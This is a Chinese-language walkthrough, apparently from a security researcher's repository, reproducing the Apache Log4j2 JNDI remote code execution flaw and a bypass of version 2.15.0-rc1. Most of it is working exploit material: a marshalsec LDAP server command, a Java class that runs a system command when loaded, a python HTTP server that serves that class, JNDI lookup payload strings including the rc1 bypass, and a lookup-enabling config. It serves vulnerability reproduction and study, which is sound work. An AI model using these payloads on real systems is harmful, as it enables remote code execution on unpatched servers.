---
layout: about
category: about
wrench: 2021-12-28
toc: true
Researchname: Apache Log4J RCE复现历程
author: Bin4xin
permalink: /about/Apache-Log4j-RCE-WalkThrough/
---

## [Apache Log4j-v2.x-x RCE](https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/ApacheLog4j)

> 影响版本：
>
> Apache Log4j 2.x <= 2.15.0-rc1

### Apache Log4j 2.x < 2.15.0-rc1 RCE

#### 环境准备

- 标题仓库中demo.jar(更接近实际渗透环境)
- 或者[<del>idea代码直接调试</del>](https://github.com/tangxiaofeng7/apache-log4j-poc/)
  - *Tips:2021-12-21更新*：
  - 原仓库作者已删除，我这里仓库重新上传了一份，[apache-log4j-poc](https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/ApacheLog4j/apache-log4j-poc)

```
[apache-log4j-poc]-git:(main)>git remote -v
origin	https://github.com/tangxiaofeng7/apache-log4j-poc.git (fetch)
origin	https://github.com/tangxiaofeng7/apache-log4j-poc.git (push)
```

> 值得注意的是：
> 
> @apache-log4j-poc仓库中的截图poc代码为缺省`127.0.0.1`，我本地并未成功，需调整为网卡监听局域网地址如`192.168.x.x`

- JDK版本11以下，我的测试版本如下：

```bash
> java -version
java version "1.8.0_181"
Java(TM) SE Runtime Environment (build 1.8.0_181-b13)
Java HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode)
```

#### 分析环境

把demo.jar拉到jd-gui中反编译：

- `com.example.log4j2_rce.Log4j2RceApplication`代码如下所示：

```java
@PostMapping({"/hello"})
public String hello(String payload) {
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
    logger.error("{}", payload);
    logger.info("{}", payload);
    logger.info(payload);
    logger.error(payload);
    return "ok";
}
```

访问路由为hello，post`payload`参数；

#### 尝试

```bash
# 启web
$ java -jar demo.jar
  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::        (v2.1.3.RELEASE)
 ···
```

直接访问加上payload进行攻击：

```bash
# 启LDAP服务：
$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.3.64/#dnslog"

# 启http：
$ cat dnslog.java
import java.lang.Runtime;
import java.lang.Process;

public class dnslog {
	static {

		try{
	 	Runtime rt = Runtime.getRuntime();
	 	String[] commands = {"open","/System/Applications/Calculator.app"};
	 	Process pc = rt.exec(commands);
	 	pc.waitFor();
	 	}catch (Exception e) {
	 	//no
		}

	}
}
$ javac dnslog.java
$ python3 -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
```

![log4j_poc_success.png](https://s2.loli.net/2021/12/15/ULolm84r2h5yeJS.png)

### Apache Log4j 2.x >= 2.15.0-rc1 RCE

#### 环境准备

- 快速开始：
- 修改[idea代码直接调试apache-log4j-poc](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CoVV/ApacheLog4j/apache-log4j-poc/pom.xml)
代码版本为`<version>2.15.0-rc1</version>`

```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <!--<version>2.14.1</version>-->
    <version>2.15.0-rc1</version>
</dependency>
    <!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-api</artifactId>
    <!--<version>2.14.1</version>-->
    <version>2.15.0-rc1</version>
</dependency>
```

- 我这里是下载好的[Log4j 2.15.0-rc1](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1)用maven编译好后本地安装到仓库，所以不会报错；
  - [点击这里了解更多关于MVN安装到本地](https://www.cnblogs.com/duguangming/p/10955124.html)

尝试payload运行控制台返回：`23:05:26.715 [main] ERROR log4j - ${jndi:ldap://192.168.3.64:1389/dnslog}`，貌似已经修复了；
但是我们经过手动添加一些选项配置仍然是可以绕过的：

- 添加[src/resources/log4j2.xml](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CoVV/ApacheLog4j/apache-log4j-poc/src/resources/log4j2.xml)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration status="OFF" monitorInterval="30">
    <appenders>
        <console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="%m{lookups}%n"/>
        </console>
    </appenders>

    <loggers>
        <root level="all">
            <appender-ref ref="Console"/>
        </root>
    </loggers>
</configuration>
```

- `<PatternLayout pattern="%m{lookups}%n"/>`开启lookup；
- 尝试打印info、debug之类的信息确定配置文件已加载；

```bash
logger.error("hello,error");
logger.info("hello,info");
logger.debug("hello,debug");
#输出如下：
hello,error
hello,info
hello,debug

Process finished with exit code 0
```

#### Bypass攻击

payload为`${jndi:ldap://127.0.0.1#.4ra1n.love:1389/badClassName}`；

具体的绕过以及RCE分析可参考[RCE](https://xz.aliyun.com/t/10689#toc-3)和[分析](https://xz.aliyun.com/t/10689#toc-4)；

![截屏2021-12-28 上午9.44.15.png](https://s2.loli.net/2021/12/28/SdgnR1A93FV5W6l.png)

## 限制

- 目前暂时只知道jdk高版本会报错：`[main] ERROR log4j - Reference Class Name: foo`

这里本人没有测试，可以移步自行分析版本限制[bilibili @GCC酱_0ff1c1a1 Log4j2 漏洞风险演示与个人看法](https://www.bilibili.com/video/BV15Q4y1e7jZ)，也欢迎贡献本仓库。

## 代码及参考

- [【安全通报】Apache Log4j2 远程代码执行漏洞](https://nosec.org/home/detail/4917.html)
- [bilibili @GCC酱_0ff1c1a1 Log4j2 漏洞风险演示与个人看法](https://www.bilibili.com/video/BV15Q4y1e7jZ)
- [Apache Log4j2从RCE到RC1绕过](https://xz.aliyun.com/t/10649)
- [浅谈Log4j2之2.15.0版本RCE](https://xz.aliyun.com/t/10689)
- [点击这里了解更多关于MVN安装到本地](https://www.cnblogs.com/duguangming/p/10955124.html)
